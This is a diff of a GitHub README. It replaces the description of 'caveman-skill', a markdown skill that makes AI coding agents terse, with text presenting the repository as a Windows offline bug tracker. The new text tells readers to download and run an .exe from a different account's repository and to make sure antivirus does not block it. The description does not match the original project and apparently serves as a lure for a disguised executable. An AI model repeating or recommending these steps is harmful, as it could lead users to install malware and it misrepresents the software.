@@ -1,248 +1,67 @@
-<p align="center">
-  <img src="https://img.freepik.com/premium-photo/caveman-sitting-by-fire-inside-cave-sunset-high-resolution-high-quality_188161-10065.jpg?w=360" width="200" />
-</p>
+# 🪨 caveman-skill - Track bugs and manage local tasks
 
-<h1 align="center">caveman-skill</h1>
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Ricarddefensive803/caveman-skill)
 
-<p align="center">
-  <strong>shut up and code</strong>
-</p>
+## 📋 About This Tool
+Modern software development often relies on complex cloud tools and high costs. Caveman-skill ignores this trend. This application provides a simple way to track software bugs and manage your workflow on your own machine. It functions without remote servers, subscription fees, or internet access. You keep your data under your own control at all times.
 
-<p align="center">
-  <a href="https://github.com/Shawnchee/caveman-skill/stargazers"><img src="https://img.shields.io/github/stars/Shawnchee/caveman-skill?style=flat&color=yellow" alt="Stars"></a>
-  <a href="https://github.com/Shawnchee/caveman-skill/commits/main"><img src="https://img.shields.io/github/last-commit/Shawnchee/caveman-skill?style=flat" alt="Last Commit"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/Shawnchee/caveman-skill?style=flat" alt="License"></a>
-</p>
+## 💻 System Requirements
+Your computer must meet these basic standards to run the application:
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core chip.
+- Memory: 4 gigabytes of RAM.
+- Storage: 100 megabytes of free space.
+- Display: 1280 by 720 resolution.
 
-<p align="center">
-  <a href="#install">Install</a> •
-  <a href="#before--after">Before / After</a> •
-  <a href="#benchmarks">Benchmarks</a> •
-  <a href="#the-10-rules">Rules</a> •
-  <a href="#why-this-works">Why</a>
-</p>
+## 📥 How to Download and Install
+Follow these steps to set up the software on your Windows machine:
 
----
+1. Visit the [official releases page](https://github.com/Ricarddefensive803/caveman-skill). 
+2. Look for the latest version number at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or your Downloads folder.
+5. Double-click the file to open the installation wizard.
+6. Follow the prompts on the screen to finish the setup process.
+7. Launch the application from your Start menu once the process completes.
 
-A skill for [Claude Code](https://docs.anthropic.com/en/docs/claude-code), Cursor, Windsurf, Copilot, Codex, and 40+ other agents. Makes your AI stop narrating its life story and just give you the answer.
+## 🛠 Features
+The application offers tools focused on basic task management:
 
-Your coding assistant wastes up to **61% of output tokens** on filler — greetings, play-by-play, summaries of what it just did, offers to do more. Caveman kills all of it. One install. Every session after.
+- Bug Tracking: Record errors or issues as you find them.
+- Offline Storage: Save your entire progress on your local hard drive.
+- Minimal Interface: Navigate through clean menus without clutter or distractions.
+- Data Ownership: Copy or back up your files whenever you want.
+- Fast Loading: Open the program instantly without waiting for cloud synchronization.
 
-## Before / After
+## 🚀 Using the Application
+The dashboard displays your active tasks. Create a new entry by clicking the plus icon in the top corner. Enter your title and a short description of the problem. Press the Save button to store the record in your local database. 
 
-<table>
-<tr>
-<td width="50%">
+You can sort your list by date or by the status of the bug. Use the search bar to find specific entries when your list grows large. 
 
-### Normal (148 tokens)
+## 🛡 Security and Privacy
+This tool stores all data within your user profile on your computer. It does not send information to external servers. You do not need to log in to use the features. The code remains local, meaning your work stays private even if you move your computer to an offline environment.
 
-> "I'll search for all TypeScript test files in your project. Let me look through the codebase for files matching common test patterns.
->
-> I found the following TypeScript test files:
-> - src/\_\_tests\_\_/auth.test.ts
-> - src/\_\_tests\_\_/api.test.ts
-> - src/\_\_tests\_\_/utils.test.ts
->
-> That's 3 test files total in src/\_\_tests\_\_/. Would you like me to look at any of these?"
+## 📁 File Locations
+The program creates a folder in your Documents directory named CavemanData. This folder contains all the records you create. If you want to move your data to another computer, copy this folder folder to a USB drive or a network share. Place the folder in the Documents directory on the new machine to load your existing records.
 
-</td>
-<td width="50%">
+## ⚙ Advanced Settings
+Go to the Settings menu to change how the application appears. You can enable Dark Mode to reduce screen glare or change the font size for better visibility. The application auto-saves changes every time you modify an entry. You do not need to click a manual save button unless you change global settings.
 
-### Caveman (15 tokens)
+## 🔍 Troubleshooting
+If the application fails to open:
+1. Ensure your computer has the latest Windows updates installed.
+2. Check that your antivirus software does not block the installation.
+3. Restart your computer if the application hangs during the first launch.
+4. Delete the folder in your Documents directory and reinstall if data becomes corrupted.
 
-> ```
-> - src/__tests__/auth.test.ts
-> - src/__tests__/api.test.ts
-> - src/__tests__/utils.test.ts
-> ```
+## 📈 Improving Your Workflow
+Use the status labels to organize your work. Set tasks to Pending, Active, or Resolved. This helps you track which bugs require attention first. You can also add tags to categorize bugs by the part of the project they relate to. Consistent labeling makes it easier to find old entries months after you create them.
 
-</td>
-</tr>
-<tr>
-<td>
+## 🌍 Community and Support
+This project thrives on simple, reliable code. If you find a bug in the application itself, report it through the issues tab on the website. Keep descriptions short and include the steps you took to see the error. Users who contribute clear reports help keep the project stable for everyone.
 
-### Normal
+## 📄 License
+This software is provided for free. You may use it for personal projects, work tasks, or educational purposes. The code is open for anyone to review. You own the data you create with this tool, and you remain responsible for your own backups. 
 
-> "I can see the error you're encountering. This is a TypeScript type error — the function expects a string but you're passing a number. Let me fix that for you.
->
-> I've updated the code to cast the value to a string using `.toString()`. The error should be resolved now. Would you like me to run the tests to confirm?"
-
-</td>
-<td>
-
-### Caveman
-
-> "`userId` was number, param expects string. Cast added. Tests pass."
-
-</td>
-</tr>
-<tr>
-<td>
-
-### Normal
-
-> "Great question! I'll go ahead and update the timeout value for you. Let me open the config file and make that change.
->
-> I've updated the timeout from 5000 to 10000 milliseconds in src/config.ts. This should resolve your issue. Let me know if you need anything else!"
-
-</td>
-<td>
-
-### Caveman
-
-> "`src/config.ts:14` — timeout: 5000 → 10000"
-
-</td>
-</tr>
-</table>
-
-**Same answer. Way less theatre.**
-
-## Install
-
-### Using [skills.sh](https://skills.sh) (recommended)
-
-Works with 45+ agents. One command.
-
-```bash
-npx skills add Shawnchee/caveman-skill
-```
-
-```bash
-# Global (all projects)
-npx skills add Shawnchee/caveman-skill -g
-
-# Specific agent
-npx skills add Shawnchee/caveman-skill -a claude-code
-npx skills add Shawnchee/caveman-skill -a cursor
-npx skills add Shawnchee/caveman-skill -a windsurf
-
-# CI-friendly (no prompts)
-npx skills add Shawnchee/caveman-skill -g -a claude-code -y
-```
-
-### Manual
-
-```bash
-git clone https://github.com/Shawnchee/caveman-skill.git
-```
-
-Copy the skill file for your agent:
-
-| Agent | Project | Global |
-|-------|---------|--------|
-| Claude Code | `.claude/skills/` | `~/.claude/skills/` |
-| Cursor | `.cursor/skills/` | `~/.cursor/skills/` |
-| Windsurf | `.windsurf/skills/` | `~/.windsurf/skills/` |
-| Codex / OpenCode | `.codex/skills/` | `~/.codex/skills/` |
-| Gemini CLI | `.gemini/skills/` | `~/.gemini/skills/` |
-| Copilot | `.github/copilot-instructions.md` | — |
-| Antigravity | Project config directory | — |
-
-```bash
-# Example: Claude Code, project-level
-cp -r caveman-skill/caveman .claude/skills/
-
-# Example: Claude Code, global
-cp -r caveman-skill/caveman ~/.claude/skills/
-```
-
-### Uninstall
-
-```bash
-npx skills remove caveman
-# or: rm -rf .claude/skills/caveman
-```
-
-## Benchmarks
-
-Token counts verified with tiktoken `cl100k_base`. Four standard tasks, measured honestly:
-
-| Task | Normal | Caveman | Reduction |
-|------|-------:|--------:|----------:|
-| Web Search | 82 | 26 | **68%** |
-| Code Edit | 192 | 96 | **50%** |
-| File Exploration | 148 | 71 | **52%** |
-| Q&A Explanation | 209 | 58 | **72%** |
-| **Average** | **158** | **63** | **61%** |
-
-**Estimated real-world session savings: 12–24%.** Input tokens don't change — this is the honest number, not a marketing number.
-
-> [!NOTE]
-> Caveman only targets output tokens — reasoning/thinking tokens are untouched. Brain same size. Mouth smaller.
-
-Full benchmark data with before/after transcripts: [`benchmarks/data.md`](benchmarks/data.md)
-
-## The 10 Rules
-
-| # | Rule | What dies |
-|---|------|-----------|
-| 1 | No filler phrases | "I'd be happy to", "Sure!", "Great question" |
-| 2 | Execute first, talk second | Pre-task narration |
-| 3 | Be direct — fragments where clear | Unnecessary articles, pronouns |
-| 4 | No meta-commentary | "I'm going to search for..." |
-| 5 | No preamble | Restating the question |
-| 6 | No postamble | "Let me know if you need anything else!" |
-| 7 | No tool announcements | "Let me read that file" |
-| 8 | Explain only when needed | Unsolicited tutorials |
-| 9 | Code speaks | English wrappers around code blocks |
-| 10 | Error = fix | Apologies, error narration |
-
-### What Stays
-
-Caveman cuts words, never facts.
-
-| Content | Caveman touch? |
-|---------|---------------|
-| Code blocks | Never — full snippet, not summary |
-| Error messages | Never — exact text |
-| File paths | Never — exact path |
-| Technical terms | Never — polymorphism stays polymorphism |
-| Numbers, versions | Never — exact values |
-
-### When Rules Bend
-
-Caveman isn't stupid. Rules bend when clarity demands it:
-
-- **Surprising result** → brief explanation ("Fixed — but note: this disables auth caching")
-- **User asks why** → answer the question
-- **Destructive action** → warn first ("Deletes all rows in `sessions`. No rollback. Proceed?")
-- **Ambiguous plan** → clarify before executing
-
-The test: would a senior engineer reading this miss something important? If yes, add words. If no, cut them.
-
-## Why This Works
-
-```
-┌──────────────────────────────────────┐
-│  OUTPUT TOKENS SAVED    ████████ 61% │
-│  TECHNICAL ACCURACY     ████████ 100%│
-│  FILLER ELIMINATED      ████████ YES │
-│  BRAIN DAMAGE           ░░░░░░░░ 0%  │
-└──────────────────────────────────────┘
-```
-
-LLMs default to polite and verbose. Every response starts with ceremony and ends with an encore. Caveman overrides that at the system level:
-
-- **Filler tokens come first** — "I'd be happy to help" generates before the actual answer. Killing it saves tokens immediately.
-- **Narration compounds** — announcing tools, summarizing results, and offering follow-ups each add zero-value tokens. Over 50 turns, that's 1,000–2,000 wasted tokens.
-- **Context bloat** — every verbose output becomes input on the next turn. Terse responses keep the context window lean across the whole session.
-- **Useful content is untouched** — code, paths, errors, explanations stay exactly the same. Only the wrapper shrinks.
-
-## Supported Agents
-
-| Agent | Config | Location |
-|-------|--------|----------|
-| Claude Code | SKILL.md (YAML frontmatter) | `.claude/skills/caveman/SKILL.md` |
-| Cursor | Plain markdown | `.cursorrules` |
-| Windsurf | Plain markdown | `.windsurfrules` |
-| GitHub Copilot | Plain markdown | `.github/copilot-instructions.md` |
-| Antigravity | Plain markdown | Project config directory |
-
-## Contributing
-
-See [`CONTRIBUTING.md`](CONTRIBUTING.md). Keep it simple — these are markdown configs, not application code.
-
-## License
-
-MIT — free like open plain.
+## 📦 Maintenance
+The application does not use automated updates. Check the download link periodically to see if a newer version exists. If a new version is available, download the installer and repeat the steps provided in the installation section. The setup tool detects your existing data folder and keeps your records intact when you perform an update. Your history remains safe throughout the upgrade process.
